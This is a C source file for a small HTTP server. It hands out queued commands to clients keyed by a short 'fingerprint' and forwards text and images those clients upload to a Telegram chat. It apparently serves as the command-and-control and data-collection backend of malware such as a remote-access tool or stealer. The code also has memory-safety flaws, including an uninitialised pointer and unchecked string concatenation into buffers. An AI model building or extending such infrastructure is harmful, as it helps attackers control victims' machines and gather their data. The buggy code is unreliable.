#include <curl/curl.h>
#include <json-c/json.h>
#include <pthread.h>
#include <stdio.h>
#include <string.h>

#include "fiobj.h"
#include "http.h"
#include "telegram.h"

void on_request(http_s *request);

int chat_id;

int main(int argc, char *argv[]) {
  if (argc != 3) {
    fprintf(stderr, "Usage: %s <BotToken> <ChatId>\n", argv[0]);
    return 1;
  }

  // Initiate telegram
  init_telegram(argv[1]);
  chat_id = atoi(argv[2]);

  // Run the "command listener" on a different thread
  pthread_t thread_id;
  pthread_create(&thread_id, NULL, handle_cmds, NULL);

  // Start listening, (Port, Binding(NULL = 0.0.0.0))
  http_listen("8080", NULL, .on_request = on_request, .log = 1);

  // Start the listener event loop
  fio_start(.threads = 1);

  // Prevent scope collaps (program exit)
  pthread_join(thread_id, NULL);

  return 0;
}

void on_request(http_s *req) {
  char *method = fiobj_obj2cstr(req->method).data;
  char *path = fiobj_obj2cstr(req->path).data;

  // Check if the request is a get
  if (strcmp(method, "GET") == 0) {
    if (strcmp(path, "/cmds") == 0) {
      if (req->query == NULL) {
        struct json_object *obj, *ok, *rsn;

        obj = json_object_new_object();
        ok = json_object_new_boolean(0);
        rsn = json_object_new_string("No query was provided.");

        json_object_object_add(obj, "ok", ok);
        json_object_object_add(obj, "reason", rsn);

        char *res = json_object_to_json_string(obj);
        http_send_body(req, res, strlen(res));

        json_object_put(obj);
        return;
      }

      char *query = fiobj_obj2cstr(req->query).data;

      char *kw = strtok(query, "=");
      if (kw == NULL) {
        struct json_object *obj, *ok, *rsn;

        obj = json_object_new_object();
        ok = json_object_new_boolean(0);
        rsn = json_object_new_string("Failed to parse the keyword.");

        json_object_object_add(obj, "ok", ok);
        json_object_object_add(obj, "reason", rsn);

        char *res = json_object_to_json_string(obj);
        http_send_body(req, res, strlen(res));

        json_object_put(obj);
        return;
      }

      char *vl = strtok(NULL, "=");
      if (vl == NULL) {
        struct json_object *obj, *ok, *rsn;

        obj = json_object_new_object();
        ok = json_object_new_boolean(0);
        rsn = json_object_new_string("Invalid to parse the query.");

        json_object_object_add(obj, "ok", ok);
        json_object_object_add(obj, "reason", rsn);

        char *res = json_object_to_json_string(obj);
        http_send_body(req, res, strlen(res));

        json_object_put(obj);
        return;
      }

      if (strcmp(kw, "fp") == 0) {
        struct json_object *obj, *ok, *cmds;

        printf("Requesting commands for : %s\n", vl);

        // Create main object
        obj = json_object_new_object();
        // Create sub data
        ok = json_object_new_boolean(1);
        cmds = json_object_new_array();

        // Write the commands to the object
        write_commands(cmds, vl);
        consume_cmds(vl);

        json_object_object_add(obj, "ok", ok);
        json_object_object_add(obj, "cmds", cmds);

        const char *res = json_object_to_json_string(obj);
        http_send_body(req, res, strlen(res));

        json_object_put(obj);
      }
    }
  } else if (strcmp(method, "POST") == 0) {
    // https://core.telegram.org/bots/api#sendmessage
    if (strcmp(path, "/data/text") == 0) {
      char *json = fiobj_obj2cstr(req->body).data;

      FIOBJ obj = FIOBJ_INVALID;
      size_t consumed = fiobj_json2obj(&obj, json, strlen(json));
      if (!consumed || !obj) {
        struct json_object *obj, *ok, *rsn;

        obj = json_object_new_object();
        ok = json_object_new_boolean(0);
        rsn = json_object_new_string("Failed to parse body.");

        json_object_object_add(obj, "ok", ok);
        json_object_object_add(obj, "reason", rsn);

        char *res = json_object_to_json_string(obj);
        http_send_body(req, res, strlen(res));

        json_object_put(obj);
      } else {
        if (FIOBJ_TYPE_IS(obj, FIOBJ_T_HASH)) {
          FIOBJ text_key = fiobj_str_new("text", 4);
          FIOBJ id_key = fiobj_str_new("fp", 2);

          char *fp;

          if (fiobj_hash_get(obj, id_key)) {
            fp = fiobj_obj2cstr(fiobj_hash_get(obj, id_key)).data;
            if (strlen(fp) != 6) {
              struct json_object *obj, *ok, *rsn;

              obj = json_object_new_object();
              ok = json_object_new_boolean(0);
              rsn = json_object_new_string("Malicious fingerprint was inserted.");

              json_object_object_add(obj, "ok", ok);
              json_object_object_add(obj, "reason", rsn);

              char *res = json_object_to_json_string(obj);
              http_send_body(req, res, strlen(res));

              json_object_put(obj);
              return;
            }
          }

          if (fiobj_hash_get(obj, text_key)) {
            struct json_object *object, *tmp;

            object = json_object_new_object();

            // ChatID
            tmp = json_object_new_int(chat_id);
            json_object_object_add(object, "chat_id", tmp);
            
            // Text
            char *text = fiobj_obj2cstr(fiobj_hash_get(obj, text_key)).data;
            char *msg = (char*) malloc((22 + 6 + 2 + 10 + strlen(text)) * sizeof(char));

            strcpy(msg, "Processing data from ");
            strcat(msg, fp);
            strcat(msg, ":\n");
            strcat(msg, text);

            tmp = json_object_new_string(msg);
            json_object_object_add(object, "text", tmp);

            // Send the post request
            send_telegram_post("/sendMessage", json_object_to_json_string(object));

            json_object_put(object);
            free(msg);
          }

          fiobj_free(text_key);
          fiobj_free(id_key);
        } else {
          struct json_object *obj, *ok, *rsn;

          obj = json_object_new_object();
          ok = json_object_new_boolean(0);
          rsn = json_object_new_string("Invalid JSON-body.");

          json_object_object_add(obj, "ok", ok);
          json_object_object_add(obj, "reason", rsn);

          char *res = json_object_to_json_string(obj);
          http_send_body(req, res, strlen(res));

          json_object_put(obj);
        }
      }

      fiobj_free(obj);
    } else if (strcmp(path, "/data/picture") == 0) {
      // https://core.telegram.org/bots/api#sendphoto
      char *json = fiobj_obj2cstr(req->body).data;

      FIOBJ obj = FIOBJ_INVALID;
      size_t consumed = fiobj_json2obj(&obj, json, strlen(json));
      if (!consumed || !obj) {
        struct json_object *obj, *ok, *rsn;

        obj = json_object_new_object();
        ok = json_object_new_boolean(0);
        rsn = json_object_new_string("Failed to parse body.");

        json_object_object_add(obj, "ok", ok);
        json_object_object_add(obj, "reason", rsn);

        char *res = json_object_to_json_string(obj);
        http_send_body(req, res, strlen(res));

        json_object_put(obj);
      } else {
        if (FIOBJ_TYPE_IS(obj, FIOBJ_T_HASH)) {
          FIOBJ img_key = fiobj_str_new("img", 3);
          FIOBJ id_key = fiobj_str_new("fp", 2);

          if (fiobj_hash_get(obj, id_key)) {
            char *fp = fiobj_obj2cstr(fiobj_hash_get(obj, id_key)).data;
            if (strlen(fp) != 6) {
              struct json_object *obj, *ok, *rsn;

              obj = json_object_new_object();
              ok = json_object_new_boolean(0);
              rsn = json_object_new_string("Malicious fingerprint was inserted.");

              json_object_object_add(obj, "ok", ok);
              json_object_object_add(obj, "reason", rsn);

              char *res = json_object_to_json_string(obj);
              http_send_body(req, res, strlen(res));

              json_object_put(obj);
              return;
            }

            struct json_object *object, *tmp;
            object = json_object_new_object();
            
            tmp = json_object_new_int(chat_id);
            json_object_object_add(object, "chat_id", tmp);
            
            // Manufacture the text
            char text[29] = "Processing data from ";
            strcat(text, fp);
            strcat(text, ":");
            
            tmp = json_object_new_string(text);
            json_object_object_add(object, "text", tmp);
            
            // Send the post request
            send_telegram_post("/sendMessage", json_object_to_json_string(object));
            
            json_object_put(object);
          }

          if (fiobj_hash_get(obj, img_key)) {
            // Get the text for the message
            char *text = fiobj_obj2cstr(fiobj_hash_get(obj, img_key)).data;

            // Handle the json part
            struct json_object *object, *tmp;

            object = json_object_new_object();

            tmp = json_object_new_int(chat_id);
            json_object_object_add(object, "chat_id", tmp);
            tmp = json_object_new_string(text);
            json_object_object_add(object, "photo", tmp);

            tmp = NULL;  // No dangling my friend

            // Send the post request
            send_telegram_post("/sendPhoto", json_object_to_json_string(object));

            json_object_put(object);
          }

          fiobj_free(img_key);
          fiobj_free(id_key);
        } else {
          struct json_object *obj, *ok, *rsn;

          obj = json_object_new_object();
          ok = json_object_new_boolean(0);
          rsn = json_object_new_string("Invalid JSON-body.");

          json_object_object_add(obj, "ok", ok);
          json_object_object_add(obj, "reason", rsn);

          char *res = json_object_to_json_string(obj);
          http_send_body(req, res, strlen(res));

          json_object_put(obj);
        }
      }

      fiobj_free(obj);
    }
  }
}
